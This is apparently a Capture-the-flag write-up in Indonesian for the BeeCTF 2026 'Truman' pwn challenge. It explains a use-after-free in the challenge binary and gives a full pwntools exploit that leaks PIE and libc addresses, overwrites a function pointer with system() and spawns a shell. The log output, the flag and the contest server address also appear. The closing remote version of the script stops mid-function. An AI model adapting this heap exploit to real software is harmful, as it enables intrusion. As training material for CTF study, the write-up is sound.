---
slug: "pwn-truman"
title: "Truman"
competition: "BeeCTF 2026"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-22"
updated: "2026-08-24"
summary: "I've always thought I have been in control of my whole world, but it's all a lie. I've finally found the door to really do what I want. Author: midn8 nc 103.185.52.197 6007 This one is hard, because I haven't really studied heap yet."
tags: ["PWN","UAF","RET2LIBC","HEAP","TCACHE","SHELL","PIE","X64","MEDIUM"]
status: "published"
flag: "BeeCTF{gut3nm0rg3n_s3l4m4ts14ng_k0nb4w4!}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-truman"
---

# Truman

> I've always thought I have been in control of my whole world, but it's all a lie. I've finally found the door to really do what I want. Author: midn8 nc 103.185.52.197 6007  This one is hard, because I haven't really studied heap yet.

![](/assets/uploads/076c1dbb-54ed-45f2-b236-266a2ceb0115-screenshot_2026-08-24_10-55-43.png)

* * *

Kita diberi beberapa file:

```bash
~/ctf/beectf/pwn/trumanshow
❯ ls --color=auto                                                                                                                                                                󰥔 17:29:33
.rw-r--r--   17 claritys 20 Aug 15:41  flag.txt
.rw-r--r-- 2.0M claritys 20 Aug 15:41  libc-2.31.so
.rwxr-xr-x  15k claritys 20 Aug 15:41 󰡯 truman
.rw-r--r-- 5.7k claritys 20 Aug 15:41  truman.c
```

Isi dari truman.c:

```c
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_SEGMENTS 12
#define TITLE_SIZE 0x18
#define MAX_SCRIPT_SIZE 0x70

typedef struct Segment Segment;

struct Segment {
    char title[TITLE_SIZE];
    size_t script_len;
    char *script;
    void (*cue)(char *script);
    unsigned long episode;
};

static Segment *g_segments[MAX_SEGMENTS];
static unsigned char g_live[MAX_SEGMENTS];
static unsigned long g_next_episode = 1;

static void init_io(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

static void show_intro(void) {
    puts("             THE TRUMAN SHOW                   ");
    puts("-------------------------------------------------");
    puts("Good morning! And in case I don't see ya:");
    puts("Good afternoon, good evening, and good night!\n");
}

static void die(const char *msg) {
    puts(msg);
    exit(0);
}

static void read_line(char *buf, size_t size) {
    if (!fgets(buf, (int)size, stdin))
        exit(0);

    buf[strcspn(buf, "\n")] = '\0';
}

static void read_exact(void *buf, size_t len) {
    size_t done = 0;

    while (done < len) {
        ssize_t got = read(STDIN_FILENO, (char *)buf + done, len - done);
        if (got <= 0)
            exit(0);
        done += (size_t)got;
    }
}

static unsigned long read_number(const char *prompt, unsigned long min, unsigned long max) {
    char buf[64];

    for (;;) {
        char *end = NULL;
        unsigned long value;

        printf("%s", prompt);
        read_line(buf, sizeof(buf));
        errno = 0;
        value = strtoul(buf, &end, 10);
        if (!errno && end != buf && *end == '\0' && value >= min && value <= max)
            return value;

        puts("The studio rejected that take.");
    }
}

static int read_slot(const char *prompt) {
    return (int)read_number(prompt, 0, MAX_SEGMENTS - 1);
}

static Segment *require_segment(int idx) {
    if (idx < 0 || idx >= MAX_SEGMENTS || g_segments[idx] == NULL)
        die("That segment is off-air.");

    return g_segments[idx];
}

static void default_cue(char *script) {
    puts("\nThe director nods and the scene rolls:");
    puts(script);
}

static void cast_segment(void) {
    int idx;
    Segment *seg;
    char title_buf[0x40];
    unsigned long script_len;

    idx = read_slot("Cast segment slot (0-11): ");
    if (g_segments[idx] != NULL)
        die("That slot already has a segment.");

    printf("Scene title: ");
    read_line(title_buf, sizeof(title_buf));

    script_len = read_number("Dialogue length: ", 1, MAX_SCRIPT_SIZE);

    seg = calloc(1, sizeof(*seg));
    if (!seg)
        die("The set ran out of budget.");

    seg->script = calloc(1, script_len + 1);
    if (!seg->script)
        die("The writers went bankrupt.");

    memset(seg->title, 0, sizeof(seg->title));
    memcpy(seg->title, title_buf, TITLE_SIZE - 1);
    seg->script_len = script_len;
    seg->cue = default_cue;
    seg->episode = g_next_episode++;

    printf("Enter the dialogue for episode %lu:\n", seg->episode);
    read_exact(seg->script, script_len);
    seg->script[script_len] = '\0';

    g_segments[idx] = seg;
    g_live[idx] = 1;

    puts("The segment is ready for broadcast.");
}

static void rewrite_segment(void) {
    int idx;
    Segment *seg;

    idx = read_slot("Rewrite slot (0-11): ");
    seg = require_segment(idx);

    printf("New dialogue (%zu bytes):\n", seg->script_len);
    read_exact(seg->script, seg->script_len);
    seg->script[seg->script_len] = '\0';

    puts("The rewrite is locked in.");
}

static void review_segment(void) {
    int idx;
    Segment *seg;

    idx = read_slot("Review slot (0-11): ");
    seg = require_segment(idx);

    printf("\n[segment %d] %.24s\n", idx, seg->title);
    printf("Episode: %lu\n", seg->episode);
    printf("Dialogue (%zu bytes): ", seg->script_len);
    fwrite(seg->script, 1, seg->script_len, stdout);
    putchar('\n');
}

static void cut_segment(void) {
    int idx;
    Segment *seg;

    idx = read_slot("Cut slot (0-11): ");
    if (idx < 0 || idx >= MAX_SEGMENTS || g_segments[idx] == NULL || !g_live[idx])
        die("That segment is already gone.");

    seg = g_segments[idx];
    free(seg->script);
    free(seg);

    g_live[idx] = 0;
    puts("The segment has been cut from the schedule.");
}

static void play_segment(void) {
    int idx;
    Segment *seg;

    idx = read_slot("Air slot (0-11): ");
    seg = require_segment(idx);

    seg->cue(seg->script);
    exit(0);
}

static void menu(void) {
    puts("What would you like to do today, Truman?\n");
    puts("1. Cast a segment");
    puts("2. Rewrite a segment");
    puts("3. Review a segment");
    puts("4. Cut a segment");
    puts("5. Air a segment");
    puts("6. Leave the show\n");
}

int main(void) {
    char buf[16];
    int choice;

    init_io();

    for (;;) {
        show_intro();
        menu();
        printf("Choice: ");
        read_line(buf, sizeof(buf));
        choice = atoi(buf);

        switch (choice) {
        case 1:
            cast_segment();
            break;
        case 2:
            rewrite_segment();
            break;
        case 3:
            review_segment();
            break;
        case 4:
            cut_segment();
            break;
        case 5:
            play_segment();
            break;
        case 6:
            puts("\n\"That's right, stay comfortable, Truman.\"");
            puts("The show continues...");
            return 0;
        default:
            puts("\n\"That's not in the script, Truman!\"");
            break;
        }

        puts("\nPress Enter to continue...");
        read_line(buf, sizeof(buf));
    }
}
```

Setelah itu kita checksec:

```bash
~/ctf/beectf/pwn/trumanshow
❯ checksec file truman                                                           󰥔 17:38:14

  _____ _    _ ______ _____ _  __ _____ ______ _____
 / ____| |  | |  ____/ ____| |/ // ____|  ____/ ____|
| |    | |__| | |__ | |    | ' /| (___ | |__ | |
| |    |  __  |  __|| |    |  <  \___ \|  __|| |
| |____| |  | | |___| |____| . \ ____) | |___| |____
 \_____|_|  |_|______\_____|_|\_\_____/|______\_____|

RELRO          Stack Canary  CFI          NX          PIE          RPATH     RUNPATH     Symbols     SafeStack           Stack Clash  W^X Seg  Selfrando     Sanitizers  FORTIFY Lvl  GLIBCXX Assert  FORTIFY  Fortified  Fortifiable  Name
Partial RELRO  Canary Found  SHSTK & IBT  NX enabled  PIE Enabled  No RPATH  No RUNPATH  No Symbols  No SafeStack Found  No Probes    Enabled  No Selfrando  None        Unknown      Unknown         Yes      1          1            truman
```

Terus kita liat func yang ada di `truman`.

```bash
~/ctf/beectf/pwn/trumanshow
❯ pwndbg truman                                                                  󰥔 17:38:03
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from truman...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
  <https://debuginfod.cachyos.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in truman)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000001120  __cxa_finalize@plt
0x0000000000001130  free@plt
0x0000000000001140  __errno_location@plt
0x0000000000001150  puts@plt
0x0000000000001160  __stack_chk_fail@plt
0x0000000000001170  strcspn@plt
0x0000000000001180  read@plt
0x0000000000001190  fgets@plt
0x00000000000011a0  calloc@plt
0x00000000000011b0  putc@plt
0x00000000000011c0  strtol@plt
0x00000000000011d0  __printf_chk@plt
0x00000000000011e0  setvbuf@plt
0x00000000000011f0  strtoul@plt
0x0000000000001200  exit@plt
0x0000000000001210  fwrite@plt
```

Nah dari situ aku bisa simpulkan kalau function `play_segment` dan `Segment` itu yang rentan. Nanti kita pakai `Segment` buat fake construct. Dan `cut_segment` sebagai main vulnerability. Dan kerentananya adalah `Use-After-Free (UAF)`.

```
static void cut_segment(void) {
    int idx;
    Segment *seg;

    idx = read_slot("Cut slot (0-11): ");
    if (idx < 0 || idx >= MAX_SEGMENTS || g_segments[idx] == NULL || !g_live[idx])
        die("That segment is already gone.");

    seg = g_segments[idx];
    free(seg->script);
    free(seg);

    g_live[idx] = 0;
    puts("The segment has been cut from the schedule.");
}

static void play_segment(void) {
    int idx;
    Segment *seg;

    idx = read_slot("Air slot (0-11): ");
    seg = require_segment(idx);

    seg->cue(seg->script);
    exit(0);
}

struct Segment {
    char title[TITLE_SIZE];
    size_t script_len;
    char *script;
    void (*cue)(char *script);
    unsigned long episode;
};
```

Sebelum kita lanjut, kita patch dulu pakai pwninit:

```bash
~/ctf/beectf/pwn/trumanshow
❯ pwninit truman elf                                                             󰥔 17:29:35
bin: truman
libc: ./libc-2.31.so

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.17_amd64.deb
Found matching file: ./lib/x86_64-linux-gnu/ld-2.31.so
unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.17_amd64.deb
Found matching file: ./usr/lib/debug/.build-id/03/23ab4806bee6f846d9ad4bccfc29afdca49a58.debug
setting ./ld-2.31.so executable
symlinking ./libc.so.6 -> libc-2.31.so
copying truman to truman_patched
running patchelf on truman_patched
writing solve.py stub
```

Nah kita dapat lihat kalau si `cut_segment` itu hanya melakukan

```
    idx = read_slot("Cut slot (0-11): ");
    if (idx < 0 || idx >= MAX_SEGMENTS || g_segments[idx] == NULL || !g_live[idx])
        die("That segment is already gone.");

    seg = g_segments[idx];
    free(seg->script);
    free(seg);

    g_live[idx] = 0; #dibbagian ini
    puts("The segment has been cut from the schedule.");
```

Padahal seharusnya kalau kita kayak ngehapus gitu pakainya `g_segments[idx] == NULL`, bukan `g_live[idx]`nya. Soalnya kita lihat aja di `require_segment`. Tidak ada `g_live[idx]` yang termention di situ, jadinya masih ada yang free.

```
static Segment *require_segment(int idx) {
    if (idx < 0 || idx >= MAX_SEGMENTS || g_segments[idx] == NULL)
        die("That segment is off-air.");

    return g_segments[idx];
}
```

Sekarang kita cari offset si `struct Segment` untuk tiap fieldnya

```
#define MAX_SEGMENTS 12
#define TITLE_SIZE 0x18
#define MAX_SCRIPT_SIZE 0x70

typedef struct Segment Segment;

struct Segment {
    char title[TITLE_SIZE];
    size_t script_len;
    char *script;
    void (*cue)(char *script);
    unsigned long episode;
};
```

Offsetnya itu dimulai dari `title`, yang di mana mulai dari `0x0` offsetnya. Nah di `title` itu sizenya `0x18` karena ngambil `TITLE_SIZE` yang isinya `0x18`, jadinya offset mulai `script_len` adalah `0x18`, dan dikarenakan yang lainnya tidak menganut variable yang sizenya didefine, default di `x64` adalah `8 bytes`, jadinya nambah `0x8` pervariable. Jadinya kalau dijadiin tabel kayak gini (pastiin bener, karena AI ku sempet salah kaprah di sini):

<table style="min-width: 50px;"><colgroup><col style="min-width: 25px;"><col style="min-width: 25px;"></colgroup><tbody><tr><th colspan="1" rowspan="1"><p><strong>variable</strong></p></th><th colspan="1" rowspan="1"><p><strong>offsetnya mulai dari</strong></p></th></tr><tr><td colspan="1" rowspan="1"><p>title</p></td><td colspan="1" rowspan="1"><p>0</p></td></tr><tr><td colspan="1" rowspan="1"><p>script_len</p></td><td colspan="1" rowspan="1"><p>0x18</p></td></tr><tr><td colspan="1" rowspan="1"><p>script</p></td><td colspan="1" rowspan="1"><p>0x20</p></td></tr><tr><td colspan="1" rowspan="1"><p>cue</p></td><td colspan="1" rowspan="1"><p>0x28</p></td></tr><tr><td colspan="1" rowspan="1"><p>episode</p></td><td colspan="1" rowspan="1"><p>0x30</p></td></tr><tr><td colspan="1" rowspan="1"><p>isinya episode</p></td><td colspan="1" rowspan="1"><p>0x38 (<strong>offset akhir</strong>)</p></td></tr></tbody></table>

```
>>> 0x18+0x8+0x8+0x8+0x8
56
>>> hex(56)
'0x38'
```

Dan juga di situ `cue` itu adalah cara kita ngeleak `PIE` serta `libc`. Karena kita bisa melihat dari function `play_segment`. Dibagian `seg->cue(seg->script);`.

```
static void play_segment(void) {
    int idx;
    Segment *seg;

    idx = read_slot("Air slot (0-11): ");
    seg = require_segment(idx);

    seg->cue(seg->script);
    exit(0);
}
```

Terus di sini kita nggak bisa langsung ngeoverwrite `cue`, tapi harus primitive dari fake `Segment`. Baru nanti kita bisa control pakai pakai `script_len` tadi yang offsetnya mulai dari `0x18` tadi. Baru kita bisa ngeleak PIE dari `default_cue`, terus lanjut `libc`, dan lanjut ke `/bin/sh`.

Nanti pastikan overlapnya tepat. Pastikan stale `g_segments[old]` menunjuk ke chunk yang sekarang menjadi script buffer controllable.

Di sini kita ngambil address milih `puts@got`, yaitu `0x000000000004028`.

```bash
~/ctf/beectf/pwn/trumanshow
❯ readelf -rW truman_patched                                                                                                                                                     󰥔 09:16:44

Relocation section '.rela.dyn' at offset 0x7b0 contains 11 entries:
    Offset             Info             Type               Symbol's Value  Symbol's Name + Addend
0000000000003de8  0000000000000008 R_X86_64_RELATIVE                         1810
0000000000003df0  0000000000000008 R_X86_64_RELATIVE                         17d0
0000000000004098  0000000000000008 R_X86_64_RELATIVE                         4098
0000000000003fd8  0000000300000006 R_X86_64_GLOB_DAT      0000000000000000 _ITM_deregisterTMCloneTable + 0
0000000000003fe0  0000000800000006 R_X86_64_GLOB_DAT      0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
0000000000003fe8  0000000c00000006 R_X86_64_GLOB_DAT      0000000000000000 __gmon_start__ + 0
0000000000003ff0  0000001300000006 R_X86_64_GLOB_DAT      0000000000000000 _ITM_registerTMCloneTable + 0
0000000000003ff8  0000001500000006 R_X86_64_GLOB_DAT      0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0
00000000000040c0  0000001400000005 R_X86_64_COPY          00000000000040c0 stdout@GLIBC_2.2.5 + 0
00000000000040d0  0000001600000005 R_X86_64_COPY          00000000000040d0 stdin@GLIBC_2.2.5 + 0
00000000000040e0  0000001700000005 R_X86_64_COPY          00000000000040e0 stderr@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x8b8 contains 15 entries:
    Offset             Info             Type               Symbol's Value  Symbol's Name + Addend
0000000000004018  0000000100000007 R_X86_64_JUMP_SLOT     0000000000000000 free@GLIBC_2.2.5 + 0
0000000000004020  0000000200000007 R_X86_64_JUMP_SLOT     0000000000000000 __errno_location@GLIBC_2.2.5 + 0
0000000000004028  0000000400000007 R_X86_64_JUMP_SLOT     0000000000000000 puts@GLIBC_2.2.5 + 0
0000000000004030  0000000500000007 R_X86_64_JUMP_SLOT     0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
0000000000004038  0000000600000007 R_X86_64_JUMP_SLOT     0000000000000000 strcspn@GLIBC_2.2.5 + 0
0000000000004040  0000000700000007 R_X86_64_JUMP_SLOT     0000000000000000 read@GLIBC_2.2.5 + 0
0000000000004048  0000000900000007 R_X86_64_JUMP_SLOT     0000000000000000 fgets@GLIBC_2.2.5 + 0
0000000000004050  0000000a00000007 R_X86_64_JUMP_SLOT     0000000000000000 calloc@GLIBC_2.2.5 + 0
0000000000004058  0000000b00000007 R_X86_64_JUMP_SLOT     0000000000000000 putc@GLIBC_2.2.5 + 0
0000000000004060  0000000d00000007 R_X86_64_JUMP_SLOT     0000000000000000 strtol@GLIBC_2.2.5 + 0
0000000000004068  0000000e00000007 R_X86_64_JUMP_SLOT     0000000000000000 __printf_chk@GLIBC_2.3.4 + 0
0000000000004070  0000000f00000007 R_X86_64_JUMP_SLOT     0000000000000000 setvbuf@GLIBC_2.2.5 + 0
0000000000004078  0000001000000007 R_X86_64_JUMP_SLOT     0000000000000000 strtoul@GLIBC_2.2.5 + 0
0000000000004080  0000001100000007 R_X86_64_JUMP_SLOT     0000000000000000 exit@GLIBC_2.2.5 + 0
0000000000004088  0000001200000007 R_X86_64_JUMP_SLOT     0000000000000000 fwrite@GLIBC_2.2.5 + 0
```

Nah berdasarkan semua informasi yang kita dapat, kita (AI) bisa membuat solver biar bisa dapetin shellnya (Local).

```python
#!/usr/bin/env python3
from pwn import *

exe = './truman_patched'
libc = ELF('./libc.so.6')
context.binary = exe

def cast(p, idx, title, length, script):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Cast segment slot (0-11): ', str(idx).encode())
    p.sendlineafter(b'Scene title: ', title)
    p.sendlineafter(b'Dialogue length: ', str(length).encode())
    p.sendafter(b'Enter the dialogue for episode', script)
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')

def rewrite(p, idx, script):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Rewrite slot (0-11): ', str(idx).encode())
    p.sendafter(b'bytes):', script)
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')

def review_raw(p, idx):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Review slot (0-11): ', str(idx).encode())
    data = p.recvuntil(b'Press Enter to continue...', drop=True)
    p.sendline(b'')
    return data

def review_script(p, idx):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Review slot (0-11): ', str(idx).encode())
    p.recvuntil(b'bytes): ')
    data = p.recvuntil(b'\n', drop=True)
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')
    return data

def cut(p, idx):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Cut slot (0-11): ', str(idx).encode())
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')

def play(p, idx):
    p.sendlineafter(b'Choice: ', b'5')
    p.sendlineafter(b'Air slot (0-11): ', str(idx).encode())

def exploit():
    p = process([exe])

    # 1. Alokasi 9 segment (0..8) dengan script 0x38
    log.info("Creating 9 segments with script 0x38")
    for i in range(9):
        cast(p, i, b'A'*0x17, 0x38, b'B'*0x38)

    # 2. Free 0..6 -> tcache 0x50 penuh
    log.info("Free 0..6 to fill tcache")
    for i in range(7):
        cut(p, i)

    # 3. Free 7 dan 8 -> fastbin
    log.info("Free 7 and 8 -> fastbin")
    cut(p, 7)
    cut(p, 8)

    # 4. Baca fd fastbin dari title Segment 8 (review_raw 8)
    log.info("Reading fd fastbin from title of Segment 8")
    out = review_raw(p, 8)
    for line in out.split(b'\n'):
        if line.startswith(b'[segment 8] '):
            title_part = line.split(b'] ', 1)[1]
            fd_raw = title_part[:6]
            fd = u64(fd_raw.ljust(8, b'\x00'))
            log.info(f"fd (fastbin pointer): {hex(fd)}")
            break
    else:
        log.error("Failed to parse fd")
        return

    # 5. Hitung alamat-alamat
    seg7 = fd + 0x10
    seg8 = seg7 + 0x90
    cue_addr = seg8 + 0x28
    script_addr = seg8 + 0x20  # field script dari Segment 9
    log.info(f"seg7: {hex(seg7)}")
    log.info(f"seg8: {hex(seg8)}")
    log.info(f"cue_addr: {hex(cue_addr)}")
    log.info(f"script_addr: {hex(script_addr)}")

    # 6. Alokasi segment 9 dengan script 0x28 (overlap)
    log.info("Alloc segment 9 with script 0x28 (overlap)")
    cast(p, 9, b'C'*0x17, 0x28, b'F'*0x28)

    # 7. Leak PIE: set seg7->script = cue_addr, lalu review(7)
    log.info("Leaking default_cue via UAF (review 7)")
    fake1  = b'X'*0x18
    fake1 += p64(8)
    fake1 += p64(cue_addr)
    fake1 = fake1.ljust(0x28, b'\x00')
    rewrite(p, 9, fake1)  # ini menulis ke script buffer 9 (freed Segment 7)

    default_cue_data = review_script(p, 7)  # UAF di slot 7
    if len(default_cue_data) < 8:
        log.error("Failed to read default_cue")
        return
    default_cue = u64(default_cue_data[:8])
    log.info(f"default_cue: {hex(default_cue)}")
    if default_cue == 0x5858585858585858:
        log.error("Still reading fake data")
        p.interactive()
        return

    default_cue_offset = 0x1820
    pie_base = default_cue - default_cue_offset
    log.info(f"PIE base: {hex(pie_base)}")

    # 8. Leak libc: set seg7->script = puts_got, review(7)
    puts_got = pie_base + 0x4028
    log.info(f"puts@GOT: {hex(puts_got)}")

    fake2  = b'Y'*0x18
    fake2 += p64(8)
    fake2 += p64(puts_got)
    fake2 = fake2.ljust(0x28, b'\x00')
    rewrite(p, 9, fake2)

    puts_data = review_script(p, 7)
    if len(puts_data) < 8:
        log.error("Failed to read puts")
        return
    puts_addr = u64(puts_data[:8])
    log.info(f"puts address: {hex(puts_addr)}")

    libc_base = puts_addr - libc.symbols['puts']
    log.info(f"libc base: {hex(libc_base)}")
    system_addr = libc_base + libc.symbols['system']
    binsh_str = b'/bin/sh\x00'
    log.info(f"system: {hex(system_addr)}")

    # 9. Overwrite cue dari Segment 9 dengan system()
    # Kita akan tulis ke cue_addr menggunakan rewrite(7) karena seg7->script = puts_got
    # Tapi kita perlu ubah seg7->script dulu menjadi cue_addr
    log.info("Setting seg7->script to cue_addr")
    fake3  = b'Z'*0x18
    fake3 += p64(8)
    fake3 += p64(cue_addr)
    fake3 = fake3.ljust(0x28, b'\x00')
    rewrite(p, 9, fake3)

    log.info("Overwriting cue of segment 9 with system()")
    rewrite(p, 7, p64(system_addr))

    # 10. Tulis /bin/sh ke script buffer segment 9
    # script buffer segment 9 ada di alamat yang ditunjuk oleh seg9->script
    # Kita perlu tahu alamat script buffer 9. Kita bisa dapatkan dari seg9->script yang valid.
    # Cara: kita bisa review(9) untuk membaca isi script buffer, tapi kita perlu alamat.
    # Kita bisa gunakan fakta bahwa script buffer 9 adalah freed Segment 7,
    # yang alamatnya = seg7? Tidak, script buffer 9 adalah chunk yang diambil dari fastbin 0x50?
    # Sebenarnya setelah cast(9,0x28), script buffer 9 diambil dari fastbin 0x50 yang merupakan Segment 8?
    # Menurut analisis sebelumnya, script buffer 9 = freed Segment 7.
    # Jadi alamat script buffer 9 = seg7 (bukan +0x10, karena seg7 adalah user data Segment 7).
    # Seg7 = fd + 0x10 adalah alamat user data dari Segment 7, yang sekarang menjadi script buffer 9.
    # Jadi script_addr_9 = seg7.
    # Tapi seg9->script menunjuk ke script buffer 9 (yang sekarang seg7).
    # Kita bisa tulis /bin/sh ke script buffer 9 dengan rewrite(9) atau rewrite(7).
    # Karena rewrite(9) menulis ke script buffer 9, kita bisa langsung rewrite(9, binsh_str).
    # Tapi rewrite(9) menulis berdasarkan seg9->script_len, yaitu 0x28.
    # Kita tulis binsh_str sepanjang 8 byte ke awal script buffer 9.

    log.info("Writing /bin/sh to script buffer of segment 9")
    # Kita tulis /bin/sh ke script buffer 9 menggunakan rewrite(9)
    # Tapi rewrite(9) akan menimpa dari awal script buffer 9.
    # Kita buat payload yang berisi /bin/sh di awal, sisanya nop.
    payload = binsh_str.ljust(0x28, b'\x00')
    rewrite(p, 9, payload)

    # 11. Trigger play(9) -> system("/bin/sh")
    log.info("Triggering play(9) to get shell")
    play(p, 9)
    p.interactive()

if __name__ == '__main__':
    exploit()
```

Implement locally:

```bash
~/ctf/beectf/pwn/trumanshow
❯ python3 solver.py                                                                                                                                                              󰥔 09:32:19
[*] '/home/claritys/ctf/beectf/pwn/trumanshow/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[*] '/home/claritys/ctf/beectf/pwn/trumanshow/truman_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process './truman_patched': pid 930709
[*] Creating 9 segments with script 0x38
[*] Free 0..6 to fill tcache
[*] Free 7 and 8 -> fastbin
[*] Reading fd fastbin from title of Segment 8
[*] fd (fastbin pointer): 0x556774302680
[*] seg7: 0x556774302690
[*] seg8: 0x556774302720
[*] cue_addr: 0x556774302748
[*] script_addr: 0x556774302740
[*] Alloc segment 9 with script 0x28 (overlap)
[*] Leaking default_cue via UAF (review 7)
[*] default_cue: 0x556751d1c820
[*] PIE base: 0x556751d1b000
[*] puts@GOT: 0x556751d1f028
[*] puts address: 0x7f6d1607a420
[*] libc base: 0x7f6d15ff6000
[*] system: 0x7f6d16048290
[*] Setting seg7->script to cue_addr
[*] Overwriting cue of segment 9 with system()
[*] Writing /bin/sh to script buffer of segment 9
[*] Triggering play(9) to get shell
[*] Switching to interactive mode
$ ls
assemblydump.dump  libc-2.31.so  solve.py   truman.c
flag.txt           libc.so.6     solver.py  truman_patched
ld-2.31.so         __pycache__   truman
```

Nah, sekarang kita (AI) tinggal mengubahnya agar bisa remote.

```python
#!/usr/bin/env python3
from pwn import *
import argparse

exe = './truman_patched'
libc = ELF('./libc.so.6')
context.binary = exe

def cast(p, idx, title, length, script):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Cast segment slot (0-11): ', str(idx).encode())
    p.sendlineafter(b'Scene title: ', title)
    p.sendlineafter(b'Dialogue length: ', str(length).encode())
    p.sendafter(b'Enter the dialogue for episode', script)
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')

def rewrite(p, idx, script):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Rewrite slot (0-11): ', str(idx).encode())
    p.sendafter(b'bytes):', script)
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')

def review_raw(p, idx):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Review slot (0-11): ', str(idx).encode())
    data = p.recvuntil(b'Press Enter to continue...', drop=True)
    p.sendline(b'')
    return data

def review_script(p, idx):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Review slot (0-11): ', str(idx).encode())
    p.recvuntil(b'bytes): ')
    data = p.recvuntil(b'\n', drop=True)
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')
    return data

def cut(p, idx):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Cut slot (0-11): ', str(idx).encode())
    p.recvuntil(b'Press Enter to continue...')
    p.sendline(b'')

def play(p, idx):
    p.sendlineafter(b'Choice: ', b'5')
    p.sendlineafter(b'Air slot (0-11): ', str(idx).encode())

def exploit(p):
    # 1. Alokasi 9 segment (0..8) dengan script 0x38
    log.info("Creating 9 segments with script 0x38")
    for i in range(9):
        cast(p, i, b'A'*0x17, 0x38, b'B'*0x38)

    # 2. Free 0..6 -> tcache 0x50 penuh
    log.info("Free 0..6 to fill tcache")
    for i in range(7):
        cut(p, i)

    # 3. Free 7 dan 8 -> masuk fastbin
    log.info("Free 7 and 8 -> fastbin")
    cut(p, 7)
    cut(p, 8)

    # 4. Baca fd fastbin dari title Segment 8 (review_raw 8)
    log.info("Reading fd fastbin from title of Segment 8")
    out = review_raw(p, 8)
    for line in out.split(b'\n'):
        if line.startswith(b'[segment 8] '):
            title_part = line.split(b'] ', 1)[1]
            fd_raw = title_part[:6]
            fd = u64(fd_raw.ljust(8, b'\x00'))
            log.info(f"fd: {hex(fd)}")
            break
    else:
        log.error("Failed to parse fd")
        return

    # 5. Hitung seg7, seg8, cue_addr
    seg7 = fd + 0x10
    seg8 = seg7 + 0x90
    cue_addr = seg8 + 0x28
    log.info(f"seg7: {hex(seg7)}")
    log.info(f"seg8: {hex(seg8)}")
    log.info(f"cue_addr: {hex(cue_addr)}")

    # 6. Alokasi segment 9 dengan script 0x28 (overlap)
    log.info("Alloc segment 9 with script 0x28 (overlap)")
    cast(p, 9, b'C'*0x17, 0x28, b'F'*0x28)

    # 7. Leak default_cue (PIE) menggunakan UAF (review 7)
    log.info("Leaking default_cue via UAF (review 7)")
    fake1  = b'X'*0x18
    fake1 += p64(8)
    fake1 += p64(cue_addr)
    fake1 = fake1.ljust(0x28, b'\x00')
    rewrite(p, 9, fake1)

    default_cue_data = review_script(p, 7)
    if len(default_cue_data) < 8:
        log.error("Failed to read default_cue")
        return
    default_cue = u64(default_cue_data[:8])
    log.info(f"default_cue: {hex(default_cue)}")
    if default_cue == 0x5858585858585858:
        log.error("Still reading fake data, offset wrong")
        p.interactive()
        return

    default_cue_offset = 0x1820
    pie_base = default_cue - default_cue_offset
    log.info(f"PIE base: {hex(pie_base)}")

    # 8. Leak libc via puts@GOT (review 7)
    puts_got = pie_base + 0x4028
    log.info(f"puts@GOT: {hex(puts_got)}")

    fake2  = b'Y'*0x18
    fake2 += p64(8)
    fake2 += p64(puts_got)
    fake2 = fake2.ljust(0x28, b'\x00')
    rewrite(p, 9, fake2)

    puts_data = review_script(p, 7)
    if len(puts_data) < 8:
        log.error("Failed to read puts")
        return
    puts_addr = u64(puts_data[:8])
    log.info(f"puts address: {hex(puts_addr)}")

    libc_base = puts_addr - libc.symbols['puts']
    log.info(f"libc base: {hex(libc_base)}")
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    log.info(f"system: {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")

    # 9. Overwrite cue segment 9 dengan system()
    log.info("Setting seg7->script to cue_addr")
    fake3  = b'A'*0x18
    fake3 += p64(8)
    fake3 += p64(cue_addr)
    fake3 = fake3.ljust(0x28, b'\x00')
